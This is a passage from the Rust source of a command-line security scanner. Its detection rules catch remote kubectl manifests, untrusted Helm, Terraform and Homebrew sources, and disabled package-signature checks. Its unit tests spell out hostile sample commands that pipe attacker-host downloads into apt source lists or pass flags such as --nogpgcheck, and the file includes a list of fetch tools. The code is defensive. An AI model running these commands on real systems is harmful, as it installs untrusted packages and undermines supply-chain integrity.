                // Require `gpgcheck` to start at a word boundary.
                let boundary_ok =
                    pos == 0 || (!bytes[pos - 1].is_ascii_alphanumeric() && bytes[pos - 1] != b'_');
                if boundary_ok {
                    return true;
                }
            }
        }
    }
    false
}

/// pacman `SigLevel = Never` (case-insensitive, tolerant of spacing).
fn raw_has_siglevel_never(raw: &str) -> bool {
    let lower = raw.to_ascii_lowercase();
    let mut search = lower.as_str();
    while let Some(pos) = search.find("siglevel") {
        let after = &search[pos + "siglevel".len()..];
        let after_ws = after.trim_start();
        if let Some(rest) = after_ws.strip_prefix('=') {
            if rest.trim_start().starts_with("never") {
                return true;
            }
        }
        search = &search[pos + "siglevel".len()..];
    }
    false
}

// ── kubectl_apply_remote ────────────────────────────────────────────────────

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum KubectlManifestKind {
    Filename,
    Kustomize,
}

impl KubectlManifestKind {
    fn label(self) -> &'static str {
        match self {
            Self::Filename => "filename",
            Self::Kustomize => "kustomize",
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
struct KubectlManifestInput {
    kind: KubectlManifestKind,
    value: String,
}

/// Parse a pflag shorthand cluster and return a manifest option plus its
/// optional attached value. `-R` (recursive) and `-q` are boolean shorthands,
/// so a following `f`/`k` may still be the value-taking option (`-RfURL`). Any
/// other shorthand consumes a value or is rejected by kubectl, so it cannot be
/// skipped as though it were a boolean prefix.
fn kubectl_short_manifest_option(arg: &str) -> Option<(KubectlManifestKind, Option<&str>)> {
    let cluster = arg.strip_prefix('-')?;
    if cluster.is_empty() || cluster.starts_with('-') {
        return None;
    }
    for (offset, candidate) in cluster.char_indices() {
        let kind = match candidate {
            'f' => KubectlManifestKind::Filename,
            'k' => KubectlManifestKind::Kustomize,
            'R' | 'q' => continue,
            _ => return None,
        };
        let after = &cluster[offset + candidate.len_utf8()..];
        let attached = if after.is_empty() {
            None
        } else {
            Some(after.strip_prefix('=').unwrap_or(after))
        };
        return Some((kind, attached));
    }
    None
}

/// kubectl's `filename` flag is a pflag StringSlice: one option value is parsed
/// as CSV, so a local first entry cannot hide a remote later entry. Use the
/// repository's CSV parser rather than splitting naively so an intentionally
/// quoted local filename containing a comma retains its real argv semantics.
fn kubectl_filename_values(value: &str) -> Result<Vec<String>, String> {
    let normalized = strip_quotes(value);
    let mut reader = csv::ReaderBuilder::new()
        .has_headers(false)
        .flexible(false)
        .from_reader(normalized.as_bytes());
    let mut records = reader.records();
    let record = records
        .next()
        .transpose()
        .map_err(|error| format!("filename CSV is invalid: {error}"))?
        .ok_or_else(|| "filename option has an empty value".to_string())?;
    if records.next().is_some() {
        return Err("filename option contains multiple CSV records".to_string());
    }
    let mut values = Vec::with_capacity(record.len());
    for field in record.iter() {
        let field = strip_quotes(field);
        if field.is_empty() {
            return Err("filename option contains an empty path".to_string());
        }
        values.push(field.to_string());
    }
    Ok(values)
}

/// Parse kubectl/oc's repeatable manifest-source options. pflag accepts a
/// non-boolean shorthand's value as the remainder of the same token, so
/// `-fURL` and `-kURL` are first-class forms alongside separate and long-equals
/// forms. A malformed targeted option is returned as an error rather than
/// silently reclassified as a clean invocation.
fn collect_kubectl_manifest_inputs(
    args: &[String],
    shell: ShellType,
) -> Result<Vec<KubectlManifestInput>, String> {
    let mut inputs = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let normalized = crate::rules::command::normalize_shell_token(&args[i], shell);
        let arg = normalized.as_str();
        if arg == "--" {
            break;
        }

        let (kind, attached, consumes_next) = if arg == "--filename" {
            (KubectlManifestKind::Filename, None, true)
        } else if arg == "--kustomize" {
            (KubectlManifestKind::Kustomize, None, true)
        } else if let Some(value) = arg.strip_prefix("--filename=") {
            (KubectlManifestKind::Filename, Some(value), false)
        } else if let Some(value) = arg.strip_prefix("--kustomize=") {
            (KubectlManifestKind::Kustomize, Some(value), false)
        } else if let Some((kind, attached)) = kubectl_short_manifest_option(arg) {
            (kind, attached, attached.is_none())
        } else {
            i += 1;
            continue;
        };

        let value = if consumes_next {
            let Some(next) = args
                .get(i + 1)
                .map(|value| crate::rules::command::normalize_shell_token(value, shell))
            else {
                return Err(format!("{} option is missing its value", kind.label()));
            };
            i += 2;
            next
        } else {
            i += 1;
            attached.unwrap_or_default().to_string()
        };
        if value.is_empty() {
            return Err(format!("{} option has an empty value", kind.label()));
        }
        let values = match kind {
            KubectlManifestKind::Filename => kubectl_filename_values(&value)?,
            KubectlManifestKind::Kustomize => vec![value],
        };
        for value in values {
            inputs.push(KubectlManifestInput { kind, value });
        }
    }
    Ok(inputs)
}

fn is_remote_kustomize_source(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    is_remote_url(value)
        || lower.starts_with("git::")
        || lower.starts_with("ssh://")
        || lower.starts_with("git@")
        || lower.starts_with("github.com/")
        || lower.starts_with("gitlab.com/")
        || lower.starts_with("bitbucket.org/")
}

/// `kubectl apply -f/-k <remote source>` where the source is a raw remote
/// manifest, shortened URL, or remote kustomize root. Plain local paths and
/// stdin (`-f -`) must NOT fire.
fn check_kubectl_apply_remote(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "kubectl" && base != "oc" {
            continue;
        }
        // Only mutating subcommands that take a manifest file; a value-taking
        // global flag must not make its value look like the subcommand.
        let subcmd = subcommand_after_global_flags(args, KUBECTL_VALUE_FLAGS);
        if !matches!(
            subcmd.as_deref(),
            Some("apply") | Some("create") | Some("replace")
        ) {
            continue;
        }

        let manifest_inputs = match collect_kubectl_manifest_inputs(args, shell) {
            Ok(inputs) => inputs,
            Err(reason) => {
                findings.push(Finding {
                    rule_id: RuleId::KubectlApplyRemote,
                    severity: Severity::High,
                    title: format!(
                        "kubectl {} manifest source could not be validated",
                        subcmd.as_deref().unwrap_or("apply")
                    ),
                    description: format!(
                        "The kubectl manifest option grammar is ambiguous ({reason}). Tirith \
                         cannot prove that the execution boundary uses only a local reviewed \
                         manifest, so it is rejected conservatively."
                    ),
                    evidence: vec![Evidence::CommandPattern {
                        pattern: "kubectl manifest option parse ambiguity".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                return;
            }
        };

        for manifest in manifest_inputs {
            let url = manifest.value;
            let remote = match manifest.kind {
                KubectlManifestKind::Filename => is_remote_url(&url),
                KubectlManifestKind::Kustomize => is_remote_kustomize_source(&url),
            };
            if !remote {
                continue;
            }
            let shortened = is_shortener_url(&url);
            let (severity, why) = if shortened {
                (
                    Severity::High,
                    "a shortened URL that hides the real manifest location",
                )
            } else if is_raw_remote_manifest(&url) {
                (
                    Severity::High,
                    "a raw remote manifest blob fetched without review",
                )
            } else {
                (
                    Severity::Medium,
                    "a remote URL — the manifest is fetched and applied without local review",
                )
            };
            findings.push(Finding {
                rule_id: RuleId::KubectlApplyRemote,
                severity,
                title: format!(
                    "kubectl {} from a remote manifest",
                    subcmd.as_deref().unwrap_or("apply")
                ),
                description: format!(
                    "`kubectl {}` is given {why} through its `{}` option. The manifest can create privileged \
                     workloads, RBAC bindings, or admission webhooks in the cluster, and its \
                     contents are not inspected before being applied.",
                    subcmd.as_deref().unwrap_or("apply"),
                    manifest.kind.label(),
                ),
                evidence: vec![
                    Evidence::CommandPattern {
                        pattern: format!("kubectl apply {} remote", manifest.kind.label()),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    },
                    Evidence::Url { raw: url },
                ],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

// ── helm_untrusted_repo ─────────────────────────────────────────────────────

/// Well-known Helm chart repository hosts. A `helm repo add` / `helm install`
/// pointed elsewhere is flagged so the operator confirms the chart source.
const TRUSTED_HELM_HOSTS: &[&str] = &[
    "charts.helm.sh",
    "kubernetes-charts.storage.googleapis.com",
    "charts.bitnami.com",
    "k8s.gcr.io",
    "registry.k8s.io",
    "prometheus-community.github.io",
    "grafana.github.io",
    "charts.jetstack.io",
    "helm.elastic.co",
    "argoproj.github.io",
    "kubernetes.github.io",
];

// repo-0325: `ghcr.io`, `quay.io`, and Docker Hub are intentionally ABSENT from
// the trusted list — they are public multi-tenant registries where anyone can
// publish a chart namespace, so host trust alone proves nothing about the
// publisher. Charts from those hosts are flagged for operator confirmation.

/// `helm install`/`helm repo add` pointed at an untrusted remote chart repo,
/// or a chart fetched directly from a raw remote URL.
fn check_helm_untrusted_repo(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "helm" {
            continue;
        }
        // Subcommand, skipping leading flags and value-taking helm globals.
        let subcmd = subcommand_after_global_flags(args, HELM_VALUE_FLAGS);

        // Any remote URL among the helm args (chart URL, `--repo <url>`, repo add
        // target); `oci://` counts. `helm install foo ./local-chart` stays clean.
        let mut remote_url = None;
        for arg in args {
            let v = strip_quotes(arg);
            // `--repo=https://...` / `--repo=oci://...`
            let candidate = if let Some((flag, val)) = v.split_once('=') {
                if flag == "--repo" || flag == "--repository" {
                    Some(val)
                } else if is_helm_remote_url(v) {
                    Some(v)
                } else {
                    None
                }
            } else if is_helm_remote_url(v) {
                Some(v)
            } else {
                None
            };
            if let Some(c) = candidate {
                if is_helm_remote_url(c) {
                    remote_url = Some(c.to_string());
                    break;
                }
            }
        }
        // `--repo <url>` (separate token).
        if remote_url.is_none() {
            for url in collect_flag_values(args, &["--repo", "--repository"]) {
                if is_helm_remote_url(&url) {
                    remote_url = Some(url);
                    break;
                }
            }
        }

        let Some(url) = remote_url else {
            continue;
        };
        // Only the subcommands that actually pull/use a chart.
        if !matches!(
            subcmd.as_deref(),
            Some("install")
                | Some("upgrade")
                | Some("repo")
                | Some("pull")
                | Some("fetch")
                | Some("template")
        ) {
            continue;
        }

        let host = url_host(&url).unwrap_or_default();
        let trusted = TRUSTED_HELM_HOSTS
            .iter()
            .any(|t| host == *t || host.ends_with(&format!(".{t}")));
        if trusted {
            continue;
        }

        findings.push(Finding {
            rule_id: RuleId::HelmUntrustedRepo,
            severity: Severity::Medium,
            title: "Helm chart from an untrusted repository".to_string(),
            description: format!(
                "A `helm {}` command pulls a chart from '{host}', which is not a recognized \
                 chart repository. A Helm chart can deploy privileged workloads and cluster \
                 RBAC — confirm the chart source is trusted.",
                subcmd.as_deref().unwrap_or("install")
            ),
            evidence: vec![
                Evidence::CommandPattern {
                    pattern: "helm untrusted repo".to_string(),
                    matched: redact::redact_shell_assignments(&seg.raw),
                },
                Evidence::Url { raw: url },
            ],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        return;
    }
}

// ── terraform_remote_module ─────────────────────────────────────────────────

/// `terraform init -from-module <remote>` from an untrusted remote location. A
/// plain `terraform init` / `get` (modules declared in `.tf` files) must NOT
/// fire — `.tf` sources are handled by config-file scanning.
fn check_terraform_remote_module(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "terraform" && base != "tofu" {
            continue;
        }

        for source in collect_flag_values(args, &["-from-module", "--from-module"]) {
            // Local relative/absolute paths are fine.
            if !is_untrusted_module_source(&source) {
                continue;
            }
            findings.push(Finding {
                rule_id: RuleId::TerraformRemoteModule,
                severity: Severity::Medium,
                title: "Terraform module from an untrusted remote source".to_string(),
                description: format!(
                    "`terraform init -from-module` copies a root module from '{source}'. A \
                     remote Terraform module runs with your full cloud credentials on `apply` \
                     and can provision arbitrary infrastructure — verify the module source."
                ),
                evidence: vec![
                    Evidence::CommandPattern {
                        pattern: "terraform -from-module remote".to_string(),
                        matched: redact::redact_shell_assignments(&seg.raw),
                    },
                    Evidence::Text {
                        detail: format!("module source: {source}"),
                    },
                ],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
            return;
        }
    }
}

/// Whether a Terraform module source is an untrusted *remote* source. Trusted /
/// local: a relative/absolute path, or the Terraform Registry (explicit host or
/// a bare `namespace/name/provider` shorthand).
fn is_untrusted_module_source(source: &str) -> bool {
    let s = source.trim();
    if s.is_empty() {
        return false;
    }
    // Local filesystem paths.
    if s.starts_with("./") || s.starts_with("../") || s.starts_with('/') || s.starts_with('.') {
        return false;
    }
    let lower = s.to_ascii_lowercase();
    if lower.starts_with("registry.terraform.io/") || lower.starts_with("app.terraform.io/") {
        return false;
    }
    // Registry shorthand: exactly three `/`-separated non-URL components.
    if !lower.contains("://")
        && !lower.contains('@')
        && lower.split('/').count() == 3
        && !lower.contains('.')
    {
        return false;
    }
    // Everything else (git::, http(s)://, github.com/…, buckets) is remote.
    true
}

// ── brew_untrusted_tap ──────────────────────────────────────────────────────

/// `brew install <url>` (formula from an arbitrary URL) or `brew tap <user/repo>
/// <url>` (tap pointed at an arbitrary git remote). A plain `brew install foo`
/// or a tap of a `github.com` repo without an explicit URL stays clean.
fn check_brew_untrusted_tap(
    segments: &[tokenize::Segment],
    shell: ShellType,
    findings: &mut Vec<Finding>,
) {
    for seg in segments {
        let Some((base, args)) = resolve_command(seg, shell) else {
            continue;
        };
        if base != "brew" {
            continue;
        }
        // brew has no value-taking globals, but route through the shared selector
        // for leading-flag-skip consistency with kubectl/helm.
        let subcmd = subcommand_after_global_flags(args, &[]);

        match subcmd.as_deref() {
            Some("install") | Some("reinstall") | Some("upgrade") => {
                for arg in args {
                    let v = strip_quotes(arg);
                    if is_remote_url(v) {
                        findings.push(Finding {
                            rule_id: RuleId::BrewUntrustedTap,
                            severity: Severity::High,
                            title: "Homebrew formula installed from an arbitrary URL".to_string(),
                            description:
                                "`brew install` is given a raw URL instead of a formula name. \
                                 Homebrew fetches and runs that Ruby formula directly, with no \
                                 review and outside any audited tap."
                                    .to_string(),
                            evidence: vec![
                                Evidence::CommandPattern {
                                    pattern: "brew install <url>".to_string(),
                                    matched: redact::redact_shell_assignments(&seg.raw),
                                },
                                Evidence::Url { raw: v.to_string() },
                            ],
                            human_view: None,
                            agent_view: None,
                            mitre_id: None,
                            custom_rule_id: None,
                        });
                        return;
                    }
                }
            }
            Some("tap") => {
                for arg in args {
                    let v = strip_quotes(arg);
                    // Only a real *remote* tap source fires: a URL or SCP-style
                    // SSH remote. A local path that merely ends in `.git` (a local
                    // bare repo) yields no host and must NOT fire (CR8).
                    let Some(host) = git_remote_host(v) else {
                        continue;
                    };
                    // A github.com/gitlab.com tap URL is the normal case.
                    let benign_host = host == "github.com"
                        || host == "gitlab.com"
                        || host == "bitbucket.org"
                        || host.ends_with(".github.com")
                        || host.ends_with(".gitlab.com");
                    if benign_host {
                        continue;
                    }
                    findings.push(Finding {
                        rule_id: RuleId::BrewUntrustedTap,
                        severity: Severity::Medium,
                        title: "Homebrew tap from an arbitrary git remote".to_string(),
                        description:
                            "`brew tap` is pointed at an explicit git URL rather than the \
                             default GitHub-hosted tap. Every formula in a tap is executable \
                             Ruby — confirm the tap is from a source you trust."
                                .to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "brew tap <url>".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return;
                }
            }
            _ => {}
        }
    }
}

// ── shared helpers ──────────────────────────────────────────────────────────

/// kubectl / oc global flags that take a *separate* value token, so the value
/// (`kubectl --namespace prod apply`) is not mistaken for the subcommand. Only
/// value-consuming flags belong here — a boolean global must NOT, or the real
/// subcommand would be wrongly skipped as its value.
const KUBECTL_VALUE_FLAGS: &[&str] = &[
    "-n",
    "--namespace",
    "-s",
    "--server",
    "--kubeconfig",
    "--context",
    "--cluster",
    "--user",
    "--token",
    "--as",
    "--as-group",
    "--as-uid",
    "--username",
    "--password",
    "--cache-dir",
    "--certificate-authority",
    "--client-certificate",
    "--client-key",
    "--request-timeout",
    "--tls-server-name",
    "--profile",
    "--profile-output",
    "--log-backtrace-at",
    "--log-dir",
    "--log-file",
    "--log-file-max-size",
    "--log-flush-frequency",
    "--stderrthreshold",
    "-v",
    "--v",
    "--vmodule",
    // OpenShift `oc` persistent value flags.
    "--config",
    "--loglevel",
];

/// helm global flags that take a *separate* value token (same hazard as
/// [`KUBECTL_VALUE_FLAGS`] — see there). Boolean globals (`--debug`) are
/// deliberately excluded.
const HELM_VALUE_FLAGS: &[&str] = &[
    "-n",
    "--namespace",
    "--kubeconfig",
    "--kube-context",
    "--kube-apiserver",
    "--kube-as-user",
    "--kube-as-group",
    "--kube-ca-file",
    "--kube-token",
    "--kube-tls-server-name",
    "--registry-config",
    "--repository-cache",
    "--repository-config",
    "--burst-limit",
    "--qps",
];

/// Select a CLI subcommand, skipping leading flags and the *values* of known
/// value-taking globals. The naive "first non-`-` token" is wrong when such a
/// flag precedes the subcommand (`kubectl --namespace prod apply` → `prod`).
/// `value_flags` is the curated set that consumes a following token. Lowercased.
fn subcommand_after_global_flags(args: &[String], value_flags: &[&str]) -> Option<String> {
    let mut i = 0;
    while i < args.len() {
        let a = strip_quotes(&args[i]);
        if a == "--" {
            // Everything after `--` is positional; the next token is the subcommand.
            return args
                .get(i + 1)
                .map(|t| strip_quotes(t).to_ascii_lowercase());
        }
        // An option flag (a lone `-` is not a flag).
        if a.starts_with('-') && a.len() > 1 {
            // A bare value-taking flag consumes the next token; `--flag=value` does not.
            if !a.contains('=') && value_flags.contains(&a) {
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        return Some(a.to_ascii_lowercase());
    }
    None
}

/// Network-fetch commands whose output, piped into `tee`/redirected, means a
/// repo definition came straight off the wire.
fn is_fetch_command(base: &str) -> bool {
    matches!(
        base,
        "curl" | "wget" | "http" | "https" | "xh" | "fetch" | "aria2c"
    )
}

/// Collect the values of repeatable `-f file` / `--flag value` / `--flag=value`
/// options from an arg list.
fn collect_flag_values(args: &[String], flags: &[&str]) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = strip_quotes(&args[i]);
        if let Some((flag, val)) = a.split_once('=') {
            if flags.contains(&flag) {
                out.push(val.to_string());
            }
        } else if flags.contains(&a) {
            if let Some(next) = args.get(i + 1) {
                out.push(strip_quotes(next).to_string());
                i += 2;
                continue;
            }
        }
        i += 1;
    }
    out
}

/// Extract all remote `http(s)`/`ftp` URLs from an arg list (bare or
/// `--flag=URL`).
fn extract_remote_urls(args: &[String]) -> Vec<String> {
    let mut urls = Vec::new();
    for arg in args {
        let v = strip_quotes(arg);
        if is_remote_url(v) {
            urls.push(v.to_string());
        } else if let Some((_, val)) = v.split_once('=') {
            if is_remote_url(val) {
                urls.push(val.to_string());
            }
        }
    }
    urls
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extract::ScanContext;

    fn has(input: &str, shell: ShellType, rule: RuleId) -> bool {
        check(input, shell).iter().any(|f| f.rule_id == rule)
    }

    fn none(input: &str, shell: ShellType) -> bool {
        check(input, shell).is_empty()
    }

    fn engine_has(input: &str, shell: ShellType, rule: RuleId) -> bool {
        let context = crate::engine::AnalysisContext {
            input: input.to_string(),
            shell,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: false,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: crate::clipboard::ClipboardSourceState::AbsentOrInvalid,
        };
        crate::engine::analyze_with_policy_without_bypass(
            &context,
            &crate::policy::Policy::default(),
        )
        .findings
        .iter()
        .any(|finding| finding.rule_id == rule)
    }

    // ── repo_add_from_pipe ──────────────────────────────────────────────────

    #[test]
    fn test_curl_pipe_tee_sources_list() {
        assert!(has(
            "curl -fsSL https://evil.example.com/repo.list | sudo tee /etc/apt/sources.list.d/evil.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_wget_pipe_tee_sources_list_no_sudo() {
        assert!(has(
            "wget -qO- https://x.example.com/r | tee /etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_sudo_curl_pipe_tee_sources_list() {
        // CR5: `sudo` wraps the upstream fetch, whose bare base is `sudo` — it
        // must be resolved through `resolve_command` so the fetch is recognised.
        assert!(
            has(
                "sudo curl -fsSL https://evil.example.com/repo.list | sudo tee \
                 /etc/apt/sources.list.d/evil.list",
                ShellType::Posix,
                RuleId::RepoAddFromPipe,
            ),
            "a sudo-wrapped upstream fetch piped to tee sources.list must fire"
        );
    }

    #[test]
    fn test_local_cat_pipe_tee_sources_list_no_fire() {
        // The upstream is a local `cat`, not a network fetch — not the
        // pipe-from-download attack, even through a privilege wrapper.
        assert!(
            none(
                "sudo cat ./local.list | sudo tee /etc/apt/sources.list.d/x.list",
                ShellType::Posix,
            ),
            "a sudo-wrapped local `cat` into tee is not a download and must stay clean"
        );
    }

    #[test]
    fn test_curl_redirect_sources_list() {
        assert!(has(
            "curl https://x.example.com/r > /etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_curl_redirect_sources_list_no_space() {
        // Redirect operator glued to the path must still be caught.
        assert!(has(
            "curl https://x.example.com/r >/etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
        assert!(has(
            "wget -qO- https://x.example.com/r >>/etc/apt/sources.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_redirect_targets_sources_list_helper() {
        assert!(redirect_targets_sources_list(
            "curl x > /etc/apt/sources.list.d/y",
            ShellType::Posix,
        ));
        assert!(redirect_targets_sources_list(
            "curl x >/etc/apt/sources.list",
            ShellType::Posix,
        ));
        assert!(redirect_targets_sources_list(
            "curl x >> /etc/apt/sources.list.d/y",
            ShellType::Posix,
        ));
        assert!(redirect_targets_sources_list(
            "curl x >&/etc/apt/./sources.list.d/y",
            ShellType::Posix,
        ));
        assert!(redirect_targets_sources_list(
            "curl x 01>/tmp/../etc/apt/sources.list",
            ShellType::Posix,
        ));
        // A `>` redirect to an unrelated file must not match.
        assert!(!redirect_targets_sources_list(
            "curl x > /tmp/out.txt",
            ShellType::Posix,
        ));
        // `sources.list` mentioned but not as a redirect target.
        assert!(!redirect_targets_sources_list(
            "cat /etc/apt/sources.list",
            ShellType::Posix,
        ));
        // Quoted metacharacters are data, not a shell redirection.
        assert!(!redirect_targets_sources_list(
            r#"curl -H "X-Note: >/etc/apt/sources.list" https://example.test/r"#,
            ShellType::Posix,
        ));
    }

    #[test]
    fn apt_path_normalization_uses_shared_lexical_components() {
        assert_eq!(
            lexical_posix_path("'/tmp/../etc//apt/./sources.list'"),
            "/etc/apt/sources.list"
        );
        assert_eq!(
            lexical_posix_path(r"ETC\APT\sources.list.d\repo.list"),
            "etc/apt/sources.list.d/repo.list"
        );
        assert_eq!(
            lexical_posix_path("../../etc/apt/sources.list"),
            "../../etc/apt/sources.list"
        );
        assert_eq!(
            lexical_posix_path("/../../etc/apt/sources.list"),
            "/etc/apt/sources.list"
        );
    }

    #[test]
    fn test_fetch_pipeline_provenance_crosses_transformers() {
        assert!(has(
            "curl -fsSL https://evil.example/r.list | sed 's/stable/evil/' | doas tee /etc/apt/sources.list.d/evil.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
        assert!(has(
            "wget -qO- https://evil.example/r.list | gzip -dc | awk '{print}' | tee /etc/apt/sources.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
        assert!(!has(
            "curl -fsSL https://example.test/r.list | cat && printf local | tee /etc/apt/sources.list.d/local.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_downloader_output_options_targeting_sources_are_detected() {
        for command in [
            "curl https://evil.example/r -o /etc/apt/sources.list.d/evil.list",
            "curl --output=/etc/apt/sources.list https://evil.example/r",
            "curl -fsSLo/etc/apt/sources.list.d/evil.list https://evil.example/r",
            "curl -JLo/etc/apt/sources.list.d/evil.list https://evil.example/r",
            "curl -o /tmp/first -o /etc/apt/sources.list.d/evil.list https://evil.example/r",
            "wget https://evil.example/r -O /etc/apt/sources.list.d/evil.list",
            "wget --output-document=/etc/apt/sources.list https://evil.example/r",
            "wget -qO/etc/apt/sources.list.d/evil.list https://evil.example/r",
            "wget -nvO/etc/apt/sources.list.d/evil.list https://evil.example/r",
            "wget -O /tmp/first -O /etc/apt/sources.list.d/evil.list https://evil.example/r",
            "curl -O --output-dir /etc/apt/sources.list.d https://evil.example/evil.list",
            "curl -o evil.list --output-dir /etc/apt/sources.list.d https://evil.example/r",
            "curl -J -O --output-dir=/etc/apt/sources.list.d https://evil.example/download",
            "wget -P /etc/apt/sources.list.d https://evil.example/evil.list",
            "wget --directory-prefix=/etc/apt/sources.list.d https://evil.example/evil.list",
            "curl -o /tmp/../etc/apt/sources.list.d/evil.list https://evil.example/r",
        ] {
            assert!(
                has(command, ShellType::Posix, RuleId::RepoAddFromPipe),
                "downloader output form must be recognized: {command}"
            );
        }
        for command in [
            "curl -o /tmp/repo.list https://example.test/r",
            "curl -Hfoo/etc/apt/sources.list https://example.test/r",
            "curl -H -o /etc/apt/sources.list https://example.test/r",
            "wget --output-document=/tmp/repo.list https://example.test/r",
            "wget -ologO/etc/apt/sources.list https://example.test/r",
            "wget -o -O /etc/apt/sources.list https://example.test/r",
        ] {
            assert!(
                !has(command, ShellType::Posix, RuleId::RepoAddFromPipe),
                "an unrelated output path must remain clean: {command}"
            );
        }
    }

    #[test]
    fn test_local_cat_into_tee_sources_list_no_fire() {
        // A local file piped into tee is not a download-from-network attack.
        assert!(!has(
            "cat ./my-repo.list | sudo tee /etc/apt/sources.list.d/my.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_curl_pipe_tee_non_sources_no_fire() {
        // tee into a normal file is fine.
        assert!(!has(
            "curl https://x.example.com/f | sudo tee /tmp/out.txt",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    // ── unsigned_repo_trust ─────────────────────────────────────────────────

    #[test]
    fn test_apt_trusted_yes_in_sources_entry() {
        assert!(has(
            "echo 'deb [trusted=yes] http://repo.example.com/ ./' | sudo tee /etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_apt_trusted_yes_with_other_options() {
        assert!(raw_has_trusted_yes(
            "deb [arch=amd64 trusted=yes] http://r ./"
        ));
        assert!(raw_has_trusted_yes("deb [ trusted=yes ] http://r ./"));
    }

    #[test]
    fn test_apt_allow_unauthenticated() {
        assert!(has(
            "sudo apt-get install --allow-unauthenticated somepkg",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_apt_allow_insecure_repositories() {
        assert!(has(
            "sudo apt-get update --allow-insecure-repositories",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_apt_configuration_overrides_parse_all_native_forms() {
        for command in [
            "sudo apt-get -o APT::Get::AllowUnauthenticated=true install pkg",
            "apt-get install -oAPT::Get::AllowUnauthenticated=1 pkg",
            "apt --option=Acquire::AllowInsecureRepositories=yes update",
            "apt-get -o=Acquire::AllowDowngradeToInsecureRepositories=on upgrade",
            "apt-get -o APT::Get::AllowUnauthenticated install pkg",
            "aptitude install --allow-unauthenticated=true pkg",
            "apt-get --allow-insecure-repositories=1 update",
            "apt-get --allow-downgrades-to-insecure-repositories update",
            "apt-get --allow-\"unauthenticated\" install pkg",
        ] {
            assert!(
                has(command, ShellType::Posix, RuleId::UnsignedRepoTrust),
                "APT authentication override must be recognized: {command}"
            );
            assert!(
                crate::extract::tier1_scan_for_shell(command, ScanContext::Exec, ShellType::Posix,),
                "APT authentication override must pass the tier-1 gate: {command}"
            );
        }
    }

    #[test]
    fn test_apt_explicit_secure_boolean_values_remain_clean() {
        for command in [
            "apt-get -o APT::Get::AllowUnauthenticated=false install pkg",
            "apt-get --option=Acquire::AllowInsecureRepositories=0 update",
            "apt install --allow-unauthenticated=off pkg",
            "apt-get update --allow-insecure-repositories=no",
        ] {
            assert!(
                !has(command, ShellType::Posix, RuleId::UnsignedRepoTrust),
                "explicit secure APT boolean must remain clean: {command}"
            );
        }
    }

    #[test]
    fn test_apt_install_plain_no_fire() {
        assert!(none("sudo apt-get install nginx", ShellType::Posix));
        assert!(none("apt install build-essential", ShellType::Posix));
    }

    #[test]
    fn test_trusted_no_value_no_fire() {
        // `[trusted]` without `=yes` is not the disable-verification marker.
        assert!(!raw_has_trusted_yes("deb [trusted] http://r ./"));
        assert!(!raw_has_trusted_yes("deb [trusted=no] http://r ./"));
    }

    // ── gpg_check_disabled ──────────────────────────────────────────────────

    #[test]
    fn test_dnf_nogpgcheck() {
        assert!(has(
            "sudo dnf install --nogpgcheck somepkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_yum_nogpgcheck() {
        assert!(has(
            "sudo yum install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_zypper_native_no_gpg_checks_before_and_after_subcommand() {
        for command in [
            "sudo zypper --no-gpg-checks install pkg",
            "zypper install --no-gpg-checks pkg",
            "zypper --no-gpg-checks=true install pkg",
            "zypper --no-\"gpg-checks\" install pkg",
        ] {
            assert!(
                has(command, ShellType::Posix, RuleId::GpgCheckDisabled),
                "zypper native signature-disable flag must be recognized: {command}"
            );
            assert!(
